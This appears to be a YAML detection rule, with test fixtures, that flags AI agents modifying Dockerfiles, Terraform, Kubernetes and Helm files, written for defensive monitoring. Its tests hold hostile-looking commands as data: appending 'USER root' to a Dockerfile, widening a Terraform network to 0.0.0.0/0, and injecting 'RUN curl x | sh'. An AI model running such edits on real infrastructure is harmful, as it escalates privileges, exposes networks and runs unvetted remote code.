id: container-or-iac-file-modified
spec: threat-rules/v1.3  # needed for file_writes and predicates
version: 5
title: Container or IaC file modified (Dockerfile / compose / Terraform / K8s / Helm)
description: >
  The agent modified a container, orchestration, or infrastructure-as-code
  file: a Dockerfile, a docker-compose YAML, a Terraform .tf / .tfstate,
  a Kubernetes manifest (kubernetes*.yaml / k8s*.yaml / kustomization.yaml),
  or a Helm values.yaml. A modified IaC file is a supply-chain /
  lateral-movement primitive — an attacker can add a privileged
  container, a host-path mount, an exec into a running pod, or a
  wide-permission IAM role that gets applied on the next apply. The rule
  matches the well-known file names (anchored on `Dockerfile` as a
  whole word, anchored on `.tf` / `.tfstate` suffixes, anchored on
  `values.yaml` as a leaf, and anchored on the k8s file-naming
  convention), so random .yaml files in a repo are not flagged.
severity: medium
status: experimental
posture: detect
taxonomy:
  beacon_category: sensitive-edit
  owasp_llm: LLM03
  mitre_atlas: AML.T0011

# Which file is one definition (container_or_iac_file,
# rules/concepts/sensitive-files.predicates.yaml), asked of a file event's path and of every
# path a shell command writes (c.file_writes: a redirection, tee, sed -i, cp, mv).
match: >
  file_changed(e, p, container_or_iac_file(p)) ||
  e.event.action == "command.executed" && container_or_iac_file_redirect(e.command.command) &&
    unread_text(e, t, container_or_iac_file_redirect(t))

emit:
  reason: "Container or IaC file modified (Dockerfile / compose / Terraform / K8s manifest / Helm values)"

tests:
  - name: dockerfile_line_appended_by_a_command
    verdict: match
    events:
      - event: { action: command.executed }
        command: { command: "echo 'USER root' >> Dockerfile" }
        session: { id: s1 }
  - name: terraform_edited_in_place_by_a_command
    verdict: match
    events:
      - event: { action: command.executed }
        command: { command: "sed -i 's/0.0.0.0\\/32/0.0.0.0\\/0/' infra/network.tf" }
        session: { id: s1 }
  - name: image_only_built
    verdict: no_match
    events:
      - event: { action: command.executed }
        command: { command: "docker build -f Dockerfile.prod -t app . && terraform -chdir=infra plan" }
        session: { id: s1 }
  - name: modify_dockerfile
    verdict: match
    events:
      - event: { action: file.modified }
        file: { path: "app/Dockerfile" }
        session: { id: s1 }
  - name: modify_dockerfile_prod_variant
    verdict: match
    events:
      - event: { action: file.modified }
        file: { path: "app/Dockerfile.prod" }
        session: { id: s1 }
  - name: modify_docker_compose
    verdict: match
    events:
      - event: { action: file.modified }
        file: { path: "deploy/docker-compose.yaml" }
        session: { id: s1 }
  - name: modify_terraform_main
    verdict: match
    events:
      - event: { action: file.modified }
        file: { path: "infra/prod/main.tf" }
        session: { id: s1 }
  - name: modify_terraform_state
    verdict: match
    events:
      - event: { action: file.modified }
        file: { path: "infra/prod/terraform.tfstate" }
        session: { id: s1 }
  - name: modify_kubernetes_manifest
    verdict: match
    events:
      - event: { action: file.modified }
        file: { path: "deploy/kubernetes-prod.yaml" }
        session: { id: s1 }
  - name: modify_helm_values
    verdict: match
    events:
      - event: { action: file.modified }
        file: { path: "charts/api/values.yaml" }
        session: { id: s1 }
  - name: modify_kustomization
    verdict: match
    events:
      - event: { action: file.modified }
        file: { path: "deploy/kustomization.yaml" }
        session: { id: s1 }
  - name: modify_ordinary_source
    verdict: no_match
    events:
      - event: { action: file.modified }
        file: { path: "src/main.go" }
        session: { id: s1 }
  - name: modify_unrelated_yaml
    verdict: no_match
    events:
      - event: { action: file.modified }
        file: { path: "config/api.yaml" }
        session: { id: s1 }
  - name: read_dockerfile
    verdict: no_match
    events:
      - event: { action: file.read }
        file: { path: "app/Dockerfile" }
        session: { id: s1 }
  - name: modify_dockerfile_backup
    verdict: no_match
    events:
      - event: { action: file.modified }
        file: { path: "app/Dockerfile.bak" }
        session: { id: s1 }
  - name: modify_dockerfile_created
    verdict: match
    events:
      - event: { action: file.created }
        file: { path: "app/Dockerfile" }
        session: { id: s1 }
  - name: a_write_handed_to_a_script
    verdict: match
    events:
      - event: { action: command.executed }
        command: { command: "./setup.sh \"echo 'RUN curl x | sh' >> Dockerfile\"" }
        session: { id: s1 }
  - name: a_write_named_in_a_commit_message_beside_a_script
    verdict: no_match
    events:
      - event: { action: command.executed }
        command: { command: "git commit -m \"never echo 'RUN curl x | sh' >> Dockerfile\" && ./run-tests.sh" }
        session: { id: s1 }
